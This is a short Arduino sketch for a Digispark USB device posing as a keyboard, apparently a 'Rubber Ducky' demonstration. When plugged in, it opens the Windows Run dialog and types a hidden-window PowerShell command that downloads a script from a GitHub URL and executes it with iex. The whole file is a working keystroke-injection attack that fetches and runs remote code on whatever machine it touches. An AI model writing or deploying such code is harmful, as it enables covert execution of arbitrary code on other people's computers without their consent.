#include <DigiKeyboard.h>

void setup() {
  delay(1500); // Short initial wait

  // switching layout, needs to be QWERTY
  DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT | MOD_SHIFT_LEFT);
  delay(250);

  // Open Windows Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(50);

  // Print the PowerShell command
  DigiKeyboard.print("powershell -w hidden -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Rob2209/RubberDuckyExample/main/displayInfo.ps1')");
  delay(5);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // switching layout back
  DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT | MOD_SHIFT_LEFT);
  // delay(250);
}

void loop() {
  // nothing
}
